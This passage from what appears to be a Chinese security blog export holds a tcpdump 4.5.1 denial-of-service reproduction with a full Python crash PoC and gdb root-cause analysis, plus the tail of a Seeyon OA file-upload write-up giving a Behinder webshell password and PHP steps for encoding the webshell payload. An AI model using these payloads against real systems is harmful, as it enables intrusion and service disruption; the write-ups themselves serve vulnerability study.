<p>冰蝎连接：默认密码：rebeyond</p>
<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113092857670.png" alt="image-20210113092857670"></p>
<h5 id="特殊："><a href="#特殊：" class="headerlink" title="特殊："></a>特殊：</h5><p>漏洞的原理很简单，感觉学到的是关于冰蝎这个poc的生成：</p>
<p>将冰蝎3默认的jsp的shell先做了base64的加密，然后做gzip数据的压缩</p>
<p>gzdecode — Decodes a gzip compressed string，解压一个使用 gzip 压缩的字符串</p>
<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113100709420.png" alt="image-20210113100709420"></p>
<p>最后进行了 url编码</p>
<p>可以自定义：</p>
<p><code>$webshell = str_replace(&quot;../webapps/seeyon/&quot;,&quot;../webapps/seeyon/&quot;,$webshell); $webshell = str_replace(&quot;PeiQi.jspx&quot;,&quot;PeiQi.jspx&quot;,$webshell); $webshell = str_replace(&quot;e45e329feb5d925b&quot;,&quot;e45e329feb5d925b&quot;,$webshell);</code></p>
<p><code>$webshell = gzencode($webshell); $webshell = iconv(&quot;ISO-8859-1&quot;,&quot;UTF-8&quot; ,$webshell); $webshell = urlencode(&quot;$webshell&quot;);</code></p>
<p>（然后关注了一下清水川崎师傅</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>seeyon OA</tag>
      </tags>
  </entry>
  <entry>
    <title>tcpdump4.5.1拒绝服务漏洞复现分析</title>
    <url>/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h4 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h4><p>新手开始学习二进制漏洞</p>
<p>选择这个开始学习，是因为这是一个网上有很多复现和分析文章的漏洞，即常见高频漏洞</p>
<p>分析文章：</p>
<blockquote>
<p><a href="https://www.freebuf.com/vuls/248394.html">https://www.freebuf.com/vuls/248394.html</a></p>
<p><a href="https://www.anquanke.com/post/id/166711">https://www.anquanke.com/post/id/166711</a></p>
<p><a href="https://bbs.pediy.com/thread-261984.htm">https://bbs.pediy.com/thread-261984.htm</a></p>
</blockquote>
<a id="more"></a>

<h5 id="0x01-前置知识："><a href="#0x01-前置知识：" class="headerlink" title="0x01 前置知识："></a>0x01 前置知识：</h5><h6 id="pcap包格式"><a href="#pcap包格式" class="headerlink" title="pcap包格式"></a>pcap包格式</h6><blockquote>
<p><a href="https://www.winpcap.org/docs/docs_412/html/incs_2pcap_8h_source.html">https://www.winpcap.org/docs/docs_412/html/incs_2pcap_8h_source.html</a></p>
</blockquote>
<p>pcap文件主要包含了三个部分，24字节的pcap文件头，16字节的数据包头，数据包内容。</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163152207.png" alt="image-20210714163152207"></p>
<h4 id="0x1-环境搭建"><a href="#0x1-环境搭建" class="headerlink" title="0x1 环境搭建"></a>0x1 环境搭建</h4><p>系统：kali 2021.2</p>
<h5 id="0x11-tcpdump安装"><a href="#0x11-tcpdump安装" class="headerlink" title="0x11 tcpdump安装"></a>0x11 tcpdump安装</h5><p>当前版本查看：</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154436177.png" alt="image-20210714154436177"></p>
<p>卸载：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get --purge remove tcpdump</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154524975.png" alt="image-20210714154524975"></p>
<h6 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a><strong>安装依赖</strong></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install flex</span><br><span class="line">apt install bison</span><br></pre></td></tr></table></figure>

<h6 id="安装libpcap"><a href="#安装libpcap" class="headerlink" title="安装libpcap"></a><strong>安装libpcap</strong></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;libpcap-1.5.3.tar.gz </span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154822298.png" alt="image-20210714154822298"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf libpcap-1.5.3.tar.gz</span><br><span class="line">cd libpcap-1.5.3</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154955786.png" alt="image-20210714154955786"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;configure</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155033795.png" alt="image-20210714155033795"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make &amp; make install</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155127829.png" alt="image-20210714155127829"></p>
<h6 id="安装tcpdump"><a href="#安装tcpdump" class="headerlink" title="安装tcpdump"></a><strong>安装tcpdump</strong></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;tcpdump-4.5.1.tar.gz</span><br><span class="line">tar -zxvf tcpdump-4.5.1.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155342417.png" alt="image-20210714155342417"></p>
<p>接下来同上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd tcpdump-4.5.1</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make &amp; make install</span><br></pre></td></tr></table></figure>

<p>装完之后查看版本：</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155539098.png" alt="image-20210714155539098"></p>
<h5 id="0x12-poc"><a href="#0x12-poc" class="headerlink" title="0x12 poc"></a>0x12 poc</h5><blockquote>
<p><a href="https://www.exploit-db.com/exploits/39875">https://www.exploit-db.com/exploits/39875</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Exploit Title: tcpdump 4.5.1 Access Violation Crash</span><br><span class="line"># Date: 31st May 2016</span><br><span class="line"># Exploit Author: David Silveiro</span><br><span class="line"># Vendor Homepage: http:&#x2F;&#x2F;www.tcpdump.org</span><br><span class="line"># Software Link: http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;tcpdump-4.5.1.tar.gz</span><br><span class="line"># Version: 4.5.1</span><br><span class="line"># Tested on: Ubuntu 14 LTS</span><br><span class="line"></span><br><span class="line">from subprocess import call</span><br><span class="line">from shlex import split</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def crash():</span><br><span class="line"></span><br><span class="line">    command &#x3D; &#39;tcpdump -r crash&#39;</span><br><span class="line">    buffer     &#x3D;   &#39;\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\xf5\xff&#39;</span><br><span class="line">    buffer     +&#x3D;  &#39;\x00\x00\x00I\x00\x00\x00\xe6\x00\x00\x00\x00\x80\x00&#39;</span><br><span class="line">    buffer     +&#x3D;  &#39;\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00&lt;\x9c7@\xff\x00&#39;</span><br><span class="line">    buffer     +&#x3D;  &#39;\x06\xa0r\x7f\x00\x00\x01\x7f\x00\x00\xec\x00\x01\xe0\x1a&#39;</span><br><span class="line">    buffer     +&#x3D;  &quot;\x00\x17g+++++++\x85\xc9\x03\x00\x00\x00\x10\xa0&amp;\x80\x18\&#39;&quot;</span><br><span class="line">    buffer     +&#x3D;  &quot;xfe$\x00\x01\x00\x00@\x0c\x04\x02\x08\n&#39;, &#39;\x00\x00\x00\x00&quot;</span><br><span class="line">    buffer     +&#x3D;  &#39;\x00\x00\x00\x00\x01\x03\x03\x04&#39;</span><br><span class="line">    with open(&#39;crash&#39;, &#39;w+b&#39;) as file:</span><br><span class="line">        file.write(buffer)</span><br><span class="line">    try:</span><br><span class="line">        call(split(command))</span><br><span class="line">        print(&quot;Exploit successful!             &quot;)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;Error: Something has gone wrong!&quot;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;Author:   David Silveiro                           &quot;)</span><br><span class="line">    print(&quot;   tcpdump version 4.5.1 Access Violation Crash    &quot;)</span><br><span class="line">    sleep(2)</span><br><span class="line">    crash()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过运行这个poc，我们可以获得一个crash文件</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714160246743.png" alt="image-20210714160246743"></p>
<h5 id="0x13-crash文件"><a href="#0x13-crash文件" class="headerlink" title="0x13 crash文件"></a>0x13 crash文件</h5><p>用winhex看一看这个crash文件</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714161151520.png" alt="image-20210714161151520"></p>
<p>对应pcap文件</p>
<h4 id="0x2-漏洞复现"><a href="#0x2-漏洞复现" class="headerlink" title="0x2 漏洞复现"></a>0x2 漏洞复现</h4><h6 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h6><p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163355396.png" alt="image-20210714163355396"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -r crash</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163544925.png" alt="image-20210714163544925"></p>
<p>发生段错误。</p>
<h6 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h6><p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714164206440.png" alt="image-20210714164206440"></p>
<h4 id="0x3-漏洞分析"><a href="#0x3-漏洞分析" class="headerlink" title="0x3 漏洞分析"></a>0x3 漏洞分析</h4><h5 id="0x31-跟踪调试"><a href="#0x31-跟踪调试" class="headerlink" title="0x31 跟踪调试"></a>0x31 跟踪调试</h5><h6 id="安装gdb及常用插件peda-pwndbg"><a href="#安装gdb及常用插件peda-pwndbg" class="headerlink" title="安装gdb及常用插件peda/pwndbg"></a>安装gdb及常用插件peda/pwndbg</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install gdb</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163905628.png" alt="image-20210714163905628"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;longld&#x2F;peda.git ~&#x2F;peda</span><br><span class="line">echo &quot;source ~&#x2F;peda&#x2F;peda.py&quot;&gt;&gt; ~&#x2F;.gdbinit</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714165900100.png" alt="image-20210714165900100"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714165918843.png" alt="image-20210714165918843"></p>
<h6 id="跟踪调试"><a href="#跟踪调试" class="headerlink" title="跟踪调试"></a>跟踪调试</h6><p><strong>用gdb打开</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb tcpdump</span><br><span class="line">gdb-peda$run -r crash文件</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170212005.png" alt="image-20210714170212005"></p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170252515.png" alt="image-20210714170252515"></p>
<p>运行后可以看到寄存器信息等：</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170640606.png" alt="image-20210714170640606"></p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170801622.png" alt="image-20210714170801622"></p>
<p>可以得知发生错误的原因：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error: Cannot access memory at address 0x5555557f7000</span><br><span class="line">#无法访问地址 0x5555557f7000 处的内存</span><br></pre></td></tr></table></figure>

<p>即访问了不可访问的地址而导致的程序崩溃</p>
<p>位置在print_ascii.c文件中的91行</p>
<p><strong>使用bt语句查看函数调用栈：</strong></p>
<p>bt:显示所有的函数调用栈帧的信息，每个帧一行。</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714171537759.png" alt="image-20210714171537759"></p>
<p>可以看到函数调用以及所在的文件情况：</p>
<table>
<thead>
<tr>
<th>文件位置</th>
<th>函数名</th>
</tr>
</thead>
<tbody><tr>
<td>libc-start.c:308</td>
<td>__libc_start_main</td>
</tr>
<tr>
<td>tcpdump.c:1569</td>
<td>main</td>
</tr>
<tr>
<td>pcap.c:849</td>
<td>pcap_loop</td>
</tr>
<tr>
<td>savefile.c:409</td>
<td>pcap_offline_read</td>
</tr>
<tr>
<td>tcpdump.c:1950</td>
<td>print_packet</td>
</tr>
<tr>
<td>print-802_15_4.c:180</td>
<td>ieee802_15_4_if_print</td>
</tr>
<tr>
<td>print-ascii.c:91</td>
<td>hex_and_ascii_print_with_offset</td>
</tr>
</tbody></table>
<p>接下来去tcpdump和libpcap的文件夹中取得上述文件，查看源码：</p>
<p>tcpdump.c:1569：调用了pcap_loop</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714181754004.png" alt="image-20210714181754004"></p>
<p>pcap.c:849：pcap_loop函数，调用了pcap_offline_read</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714181831537.png" alt="image-20210714181831537"></p>
<p>savefile.c:409:pcap_offline_read函数：</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714182139084.png" alt="image-20210714182139084"></p>
<p>这里面有一个callback，根据函数调用栈可以知道是调用了print_packet</p>
<p>tcpdump中的print_packet函数中，这里调用了ieee802_15_4_if_print</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715170515455.png" alt="image-20210715170515455"></p>
<p>在print-802_15_4的ieee802_15_4_if_print函数中，调用了ndo_default_print：</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715170602361.png" alt="image-20210715170602361"></p>
<p>通过搜索这个函数，我们可以看到里面调用了hex_and_ascii_print：</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715171350065.png" alt="image-20210715171350065"></p>
<p>hex_and_ascii_print直接调用了hex_and_ascii_print_with_offset：</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715171624113.png" alt="image-20210715171624113"></p>
<p>函数在print-ascii中：</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715170659670.png" alt="image-20210715170659670"></p>
<p>根据while，知道这是一个循环，就可以猜测原因大概是因为循环，s2越界访问了</p>
<p>可以看出循环与nshorts有关，根据86行代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nshorts &#x3D; length &#x2F; sizeof(u_short);</span><br></pre></td></tr></table></figure>

<p>得知与length有关</p>
<p>一路向上寻找传入的length参数，根据以下调用：length就是caplen</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(ndo-&gt;ndo_default_print)(ndo, p, caplen);</span><br></pre></td></tr></table></figure>

<p>结合gdb单步调试和源码分析ieee802_15_4_if_print函数：</p>
<p>给ieee802_15_4_if_print函数下断点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b ieee802_15_4_if_print</span><br><span class="line">run -r crash</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715180222023.png" alt="image-20210715180222023"></p>
<p>然后s进入，可以继续单步n调试</p>
<p>查看变量此时的值：</p>
<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715181224711.png" alt="image-20210715181224711"></p>
<p>ieee802_15_4_if_print函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ieee802_15_4_if_print(struct netdissect_options *ndo,</span><br><span class="line">                      const struct pcap_pkthdr *h, const u_char *p)</span><br><span class="line">&#123;</span><br><span class="line">	u_int caplen &#x3D; h-&gt;caplen;</span><br><span class="line">	int hdrlen;</span><br><span class="line">	u_int16_t fc;</span><br><span class="line">	u_int8_t seq;</span><br><span class="line"></span><br><span class="line">	if (caplen &lt; 3) &#123;&#x2F;&#x2F;n步第一次，caplen &#x3D; 0x8</span><br><span class="line">		ND_PRINT((ndo, &quot;[|802.15.4] %x&quot;, caplen));</span><br><span class="line">		return caplen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fc &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">	hdrlen &#x3D; extract_header_length(fc);&#x2F;&#x2F;n步第二次，fc &#x3D; 0xff40</span><br><span class="line"></span><br><span class="line">	seq &#x3D; EXTRACT_LE_8BITS(p + 2);</span><br><span class="line"></span><br><span class="line">	p +&#x3D; 3;&#x2F;&#x2F;n步第三次，hdrlen &#x3D; 0x12</span><br><span class="line">	caplen -&#x3D; 3;&#x2F;&#x2F;n步第三次</span><br><span class="line"></span><br><span class="line">	ND_PRINT((ndo,&quot;IEEE 802.15.4 %s packet &quot;, ftypes[fc &amp; 0x7]));&#x2F;&#x2F;n步第四次，caplen &#x3D; 0x5</span><br><span class="line">	if (vflag)&#x2F;&#x2F;n步第五次</span><br><span class="line">		ND_PRINT((ndo,&quot;seq %02x &quot;, seq));</span><br><span class="line">	if (hdrlen &#x3D;&#x3D; -1) &#123;</span><br><span class="line">		ND_PRINT((ndo,&quot;malformed! &quot;));</span><br><span class="line">		return caplen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	if (!vflag) &#123;</span><br><span class="line">		p+&#x3D; hdrlen;&#x2F;&#x2F;n步第六次</span><br><span class="line">		caplen -&#x3D; hdrlen;&#x2F;&#x2F;n步第七次，caplen和hdrlen做了运算</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		u_int16_t panid &#x3D; 0;</span><br><span class="line"></span><br><span class="line">		switch ((fc &gt;&gt; 10) &amp; 0x3) &#123;</span><br><span class="line">		case 0x00:</span><br><span class="line">			ND_PRINT((ndo,&quot;none &quot;));</span><br><span class="line">			break;</span><br><span class="line">		case 0x01:</span><br><span class="line">			ND_PRINT((ndo,&quot;reserved destination addressing mode&quot;));</span><br><span class="line">			return 0;</span><br><span class="line">		case 0x02:</span><br><span class="line">			panid &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">			p +&#x3D; 2;</span><br><span class="line">			ND_PRINT((ndo,&quot;%04x:%04x &quot;, panid, EXTRACT_LE_16BITS(p)));</span><br><span class="line">			p +&#x3D; 2;</span><br><span class="line">			break;</span><br><span class="line">		case 0x03:</span><br><span class="line">			panid &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">			p +&#x3D; 2;</span><br><span class="line">			ND_PRINT((ndo,&quot;%04x:%s &quot;, panid, le64addr_string(p)));</span><br><span class="line">			p +&#x3D; 8;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">		ND_PRINT((ndo,&quot;&lt; &quot;);</span><br><span class="line"></span><br><span class="line">		switch ((fc &gt;&gt; 14) &amp; 0x3) &#123;</span><br><span class="line">		case 0x00:</span><br><span class="line">			ND_PRINT((ndo,&quot;none &quot;));</span><br><span class="line">			break;</span><br><span class="line">		case 0x01:</span><br><span class="line">			ND_PRINT((ndo,&quot;reserved source addressing mode&quot;));</span><br><span class="line">			return 0;</span><br><span class="line">		case 0x02:</span><br><span class="line">			if (!(fc &amp; (1 &lt;&lt; 6))) &#123;</span><br><span class="line">				panid &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">				p +&#x3D; 2;</span><br><span class="line">			&#125;</span><br><span class="line">			ND_PRINT((ndo,&quot;%04x:%04x &quot;, panid, EXTRACT_LE_16BITS(p)));</span><br><span class="line">			p +&#x3D; 2;</span><br><span class="line">			break;</span><br><span class="line">		case 0x03:</span><br><span class="line">			if (!(fc &amp; (1 &lt;&lt; 6))) &#123;</span><br><span class="line">				panid &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">				p +&#x3D; 2;</span><br><span class="line">			&#125;</span><br><span class="line">                        ND_PRINT((ndo,&quot;%04x:%s &quot;, panid, le64addr_string(p))));</span><br><span class="line">			p +&#x3D; 8;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		caplen -&#x3D; hdrlen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (!suppress_default_print)&#x2F;&#x2F;n步第八次，此时caplen&#x3D;0xfffffff3</span><br><span class="line">		(ndo-&gt;ndo_default_print)(ndo, p, caplen);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而0xfffffff3=-13</p>
<p>作为length传入之后，可以得到nshorts为‭7FFFFFF9‬（0xfffffff3/2）</p>
<p>变成了一个极大的值，而数据包并没有这么大，因此最终访问到未授权的内存地址。</p>
<p>所以这个漏洞就是因为tcpdump会根据caplen长度去读取保存在内存空间数据包的内容，当引用到不可读取内存位置时，造成拒绝服务漏洞。</p>
<h5 id="0x32-poc"><a href="#0x32-poc" class="headerlink" title="0x32 poc"></a>0x32 poc</h5><p>caplen是由于做了caplen -= hdrlen;操作变成了负数，才导致了后续nshorts变成极大的值</p>
<p>因此只要我们的caplen-hdrlen是负数就可以了，这样的包就会引发漏洞</p>
]]></content>
      <categories>
        <category>二进制漏洞</category>
      </categories>
      <tags>
        <tag>tcpdump</tag>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>世界线偏移-2021.6.10</title>
    <url>/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/</url>
    <content><![CDATA[<p>近期的一些小成果：</p>
<a id="more"></a>

<p>1、成长平台百分，写了不少脚本和总结</p>
<p><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210528091015995.png" alt="image-20210528091015995"></p>
<p><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210528100934762.png" alt="image-20210528100934762" style="zoom: 50%;"><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210528100950328.png" alt="image-20210528100950328" style="zoom: 33%;"></p>
<p>2、换了个更好的公司</p>
<p><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210610145500746.png" alt="image-20210610145500746"></p>
]]></content>
  </entry>
  <entry>
    <title>加密与解密笔记--更新中</title>
    <url>/2020/11/10/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h3><a id="more"></a>

<h4 id="0x1-基础"><a href="#0x1-基础" class="headerlink" title="0x1 基础"></a>0x1 基础</h4><h5 id="0x01-大端小端"><a href="#0x01-大端小端" class="headerlink" title="0x01 大端小端"></a>0x01 大端小端</h5><p>大端：12345678h存入后还是12345678，高位字节存入低地址，依序</p>
<p>小端：12345678h存入后变为78563412，低位字节存入低地址，反序</p>
